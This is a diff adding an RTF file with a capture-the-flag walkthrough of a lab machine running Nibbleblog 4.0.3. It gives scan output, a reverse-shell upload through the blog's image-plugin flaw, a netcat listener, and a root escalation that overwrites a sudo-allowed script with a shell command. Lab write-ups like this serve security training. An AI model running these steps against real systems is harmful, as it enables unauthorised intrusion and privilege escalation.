@@ -1,0 +1,133 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2513
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\froman\fcharset0 Times-Roman;\f1\froman\fcharset0 Times-Bold;\f2\froman\fcharset0 Times-BoldItalic;
+\f3\ftech\fcharset77 Symbol;\f4\fmodern\fcharset0 Courier;}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red0\green0\blue233;}
+{\*\expandedcolortbl;;\cssrgb\c0\c0\c0;\cssrgb\c0\c0\c93333;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
+\deftab720
+\pard\pardeftab720\partightenfactor0
+
+\f0\fs24 \cf2 \expnd0\expndtw0\kerning0
+\ul \ulc2 \outl0\strokewidth0 \strokec2 Enumeration\ulnone \
+\
+\
+1) 
+\f1\b \ul Nmap scan
+\f0\b0 \ulnone :-\
+\
+PORT STATE SERVICE VERSION\
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\
+| ssh-hostkey: \
+| 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\
+| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\
+|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\
+80/tcp open http Apache httpd 2.4.18 ((Ubuntu))\
+|_http-server-header: Apache/2.4.18 (Ubuntu)\
+|_http-title: Site doesn't have a title (text/html).\
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\
+Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)\
+No exact OS matches for host (test conditions non-ideal).\
+Network Distance: 2 hops\
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\
+\
+TRACEROUTE (using port 80/tcp)\
+HOP RTT ADDRESS\
+1 332.62 ms 10.10.14.1\
+2 332.81 ms 10.10.10.75\
+\
+\
+\
+\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f1\b \cf2 2) \ul go to 10.10.10.75\ulnone  :-
+\f0\b0 \
+\
+1.inspect element\
+-> nibbleblog directory\
+\
+\
+\
+3) 
+\f1\b \ul to find more Directories
+\f0\b0 \ulnone :-\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f2\i\b \cf2 1. Run dirb or dirbuster .
+\f0\i0\b0 \
+\
+==> dirb {\field{\*\fldinst{HYPERLINK "http://10.10.10.75/nibbleblog"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 http://10.10.10.75/nibbleblog}} \
+\
+URL_BASE: {\field{\*\fldinst{HYPERLINK "http://10.10.10.75/nibbleblog/"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 http://10.10.10.75/nibbleblog/}}\
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\
+\
+GENERATED WORDS: 4612 \
+\
+---- Scanning URL: {\field{\*\fldinst{HYPERLINK "http://10.10.10.75/nibbleblog/"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 http://10.10.10.75/nibbleblog/}} ----\
+==> DIRECTORY: {\field{\*\fldinst{HYPERLINK "http://10.10.10.75/nibbleblog/admin/"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 http://10.10.10.75/nibbleblog/admin/}} \
++ {\field{\*\fldinst{HYPERLINK "http://10.10.10.75/nibbleblog/admin.php"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 http://10.10.10.75/nibbleblog/admin.php}} (CODE:200|SIZE:1401) \
+==> DIRECTORY: {\field{\*\fldinst{HYPERLINK "http://10.10.10.75/nibbleblog/content/"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 http://10.10.10.75/nibbleblog/content/}} \
++ {\field{\*\fldinst{HYPERLINK "http://10.10.10.75/nibbleblog/index.php"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 http://10.10.10.75/nibbleblog/index.php}} (CODE:200|SIZE:2987) \
+==> DIRECTORY: {\field{\*\fldinst{HYPERLINK "http://10.10.10.75/nibbleblog/languages/"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 http://10.10.10.75/nibbleblog/languages/}} \
+==> DIRECTORY: {\field{\*\fldinst{HYPERLINK "http://10.10.10.75/nibbleblog/plugins/"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 http://10.10.10.75/nibbleblog/plugins/}} \
++ {\field{\*\fldinst{HYPERLINK "http://10.10.10.75/nibbleblog/README"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 http://10.10.10.75/nibbleblog/README}} (CODE:200|SIZE:4628) \
+==> DIRECTORY: {\field{\*\fldinst{HYPERLINK "http://10.10.10.75/nibbleblog/themes/"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 http://10.10.10.75/nibbleblog/themes/}}\
+\
+\
+\
+4) Go to {\field{\*\fldinst{HYPERLINK "http://10.10.10.75/nibbleblog/admin.php"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 http://10.10.10.75/nibbleblog/admin.php}}\
+5) Search for nibbles Default User name and Password.\
+6) Search for its version.\
+\pard\pardeftab720\partightenfactor0
+
+\f3 \cf2 \uc0\u8658 
+\f0  {\field{\*\fldinst{HYPERLINK "http://nibbleblog.com/"}}{\fldrslt \cf3 \ul \ulc3 \strokec3 Nibbleblog 4.0.3 "Coffee"}}\
+\
+7) Search for vulnerbility for Nibbleblog 4.0.3 on Google or searchsploit .\
+8) It has vulnerbility in image dir.\
+9) upload php-reverse-shell. by pentest monkey. (change the ip and port(if needed) ).\
+10) set Netcat listener\
+=> nc -lvnp PORT\
+\
+11) search 
+\f4 http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
+\f0  to execute script.\
+\
+13) We get the shell on Netcat.\
+\
+14) inside shell\
+=> sudo -l\
+OUT: User nibbler may run the following commands on Nibbles:\
+(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\
+\
+=> cd /home/nibbler\
+=> cat user.txt\
+=> unzip personal.zip\
+=> cd personal/stuff\
+\
+\
+=> cat monitor.sh\
+\
+\
+\
+15)
+\f2\i\b \ul Priveledge escalation
+\f0\i0\b0 \ulnone \
+\
+=> echo "\
+\pard\pardeftab720\sa280\partightenfactor0
+
+\f1\b\fs28 \cf2 #!/bin/bash \\nsh -c /bin/sh" > \
+\pard\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "https://www.youtube.com/redirect?event=comments&redir_token=QUFFLUhqbEpqSWxmZXVXaHZkek51cTE3OWI2Mkh4X1V2Z3xBQ3Jtc0ttektwbWllMm5VOWZfX1JfQmZreEFsbnJmX3ZUUVBUbVJqaFMwbkJ2OFhTdnUtWkpYSlRadTdnRktIT1AyLXlhVHVrT3d3cURaSWtjM3ZvemZITG1RMjlEV205WmpuNWpqbzNIYVdlM2lnSlZyT3Y2cw&q=http%3A%2F%2Fmonitor.sh%2F&stzid=UgzmsGxvNocwhnUlcY94AaABAg.9005TOmzLL493bAZVVpayW"}}{\fldrslt 
+\f0\b0\fs24 \cf3 \ul \ulc3 \strokec3 monitor.sh}}
+\f0\b0\fs24 \
+cat monitor.sh\
+OUT:sh -c /bin/sh\
+\
+=> sudo -u root ./monitor.sh\
+\
+=> cat /root/root.txt\
+}
